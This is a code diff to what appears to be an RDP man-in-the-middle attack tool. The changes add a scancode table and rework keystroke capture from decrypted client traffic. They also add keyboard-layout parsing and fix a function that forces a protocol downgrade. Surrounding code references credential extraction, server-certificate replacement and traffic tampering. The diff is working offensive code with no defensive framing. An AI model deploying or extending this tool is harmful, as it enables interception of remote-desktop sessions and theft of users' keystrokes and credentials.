@@ -66,6 +66,24 @@ TERM_SIGN_PRIV_KEY = { # little endian, from [MS-RDPBCGR].pdf
 }
 
 
+# http://www.millisecond.com/support/docs/v5/html/language/scancodes.htm
+SCANCODE = {
+    0: None,
+    1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9:
+    "8", 10: "9", 11: "0", 12: "-", 13: "=", 14: "Backspace", 15: "Tab", 16: "Q",
+    17: "W", 18: "E", 19: "R", 20: "T", 21: "Y", 22: "U", 23: "I", 24: "O",
+    25: "P", 26: "[", 27: "]", 28: "Enter", 29: "CTRL", 30: "A", 31: "S",
+    32: "D", 33: "F", 34: "G", 35: "H", 36: "J", 37: "K", 38: "L", 39: ";",
+    40: "'", 41: "`", 42: "LShift", 43: "\\", 44: "Z", 45: "X", 46: "C", 47:
+    "V", 48: "B", 49: "N", 50: "M", 51: ",", 52: ".", 53: "/", 54: "RShift",
+    55: "PrtSc", 56: "Alt", 57: "Space", 58: "Caps", 59: "F1", 60: "F2", 61:
+    "F3", 62: "F4", 63: "F5", 64: "F6", 65: "F7", 66: "F8", 67: "F9", 68:
+    "F10", 69: "Num", 70: "Scroll", 71: "Home (7)", 72: "Up (8)", 73:
+    "PgUp (9)", 74: "-", 75: "Left (4)", 76: "Center (5)", 77: "Right (6)",
+    78: "+", 79: "End (1)", 80: "Down (2)", 81: "PgDn (3)", 82: "Ins", 83:
+    "Del",
+}
+
 class RC4(object):
     def __init__(self, key):
         x = 0
@@ -271,7 +289,7 @@ def decrypt(bytes, From="Client"):
             cleartext = rc4_decrypt(bytes[offset:], From=From)
     else: # slow path
         offset = 13
-        if len(bytes) < 13: return bytes
+        if len(bytes) <= 15: return bytes
         if bytes[offset] >= 0x80: offset += 1
         offset += 1
         security_flags = struct.unpack('<H', bytes[offset:offset+2])[0]
@@ -384,37 +402,50 @@ def extract_credentials(bytes, m):
         return b""
 
 
-def extract_keyboard_layout(bytes):
-    offset = len(bytes) - 80
+def extract_keyboard_layout(bytes, m):
+    length = struct.unpack('<H', unhexlify(m.groups()[0]))[0]
+    offset = len(m.group())//2 - length + 8
     global keyboard_info
+    #  try:
     keyboard_info = {
-        "layout": substr(bytes, offset, 4),
-        "type": substr(bytes, offset+4, 4),
-        "subtype": substr(bytes, offset+8, 4),
-        "funckey": substr(bytes, offset+12, 4),
+        "layout": struct.unpack("<I", substr(bytes, offset, 4))[0],
+        "type": struct.unpack("<I", substr(bytes, offset+4, 4))[0],
+        "subtype": struct.unpack("<I", substr(bytes, offset+8, 4))[0],
+        "funckey": struct.unpack("<I", substr(bytes, offset+12, 4))[0]
     }
-    return b"Keyboard layout/type: %s/%s" % (keyboard_info["layout"],
-                                             keyboard_info["type"],)
+    return b"Keyboard layout/type/subtype: 0x%x/0x%x/0x%x" % (
+        keyboard_info["layout"],
+        keyboard_info["type"],
+        keyboard_info["subtype"],
+    )
+    #  except:
+    #      return b""
 
 
 def translate_keycode(key):
-    return key
+    # TODO find key wrt to locale and kbd type
+    try:
+        return SCANCODE[key]
+    except:
+        return None
 
 
 def extract_key_press(bytes):
-    if len(bytes)>4:
-        event = bytes[-5]
-        key = bytes[-4]
-    else:
-        event = bytes[2]
-        key = bytes[3]
-    key = translate_keycode(key)
-    # TODO map scancode to ascii
-    # get language locale and keyboard layout
-    if event == 0:
-        return b"Key press:   %d" % key
-    elif event == 192 or event == 1:
-        return b"Key release: %d" % key
+    result = b""
+    #  hexdump(bytes)
+    if is_fast_path(bytes):
+        event = bytes[-2]
+        key = bytes[-1]
+        key = translate_keycode(key)
+        if event %2 == 0 and key:
+            result += b"Key press:   %s\n" % key.encode()
+        elif event % 2 == 1 and key:
+            result += b"Key release: %s\n" % key.encode()
+        if event > 1 and key:
+            result += extract_key_press(
+                b"\x44%c%s" % (len(bytes)-2, bytes[2:-2])
+            ) + b"\n"
+    return result[:-1]
 
 
 def replace_server_cert(bytes):
@@ -466,7 +497,7 @@ def parse_rdp(bytes, From="Client"):
 
 def parse_rdp_packet(bytes, From="Client"):
 
-    #  if len(bytes) < 4: return None
+    if len(bytes) < 4: return None
     if sym_encryption_enabled():
         bytes = decrypt(bytes, From=From)
     #  hexdump(bytes)
@@ -507,14 +538,13 @@ def parse_rdp_packet(bytes, From="Client"):
     if m:
         result = extract_server_cert(bytes)
 
-    regex = b".*0d00.{178}0000" ## TODO
+    regex = b".*0d00(.{4}).{164}0000" ## TODO
     m = re.match(regex, hexlify(bytes))
-    if m:
-        #  result = extract_keyboard_layout(bytes)
-        pass
+    if m and From == "Client":
+        result = extract_keyboard_layout(bytes, m)
 
 
-    if len(bytes)>3 and bytes[2] in [b"\x00", b"\x01"]:
+    if len(bytes)>3 and bytes[-2] in [0,1,2,3] and result == b"":
         result = extract_key_press(bytes)
 
     #  keymap_regex = b".*en-us.*" # TODO find keymap definition
@@ -554,9 +584,9 @@ def tamper_data(bytes):
     return result
 
 
-def set_fake_requested_protocol(bytes, m):
+def set_fake_requested_protocol(data, m):
     offset = len(m.group())//2
-    result = bytes[:offset+6] + chr(RDP_PROTOCOL_OLD).encode() + bytes[offset+7:]
+    result = data[:offset+6] + bytes([RDP_PROTOCOL_OLD]) + data[offset+7:]
     return result
 
 #  with open("data/server_cert.bytes", 'rb') as f:
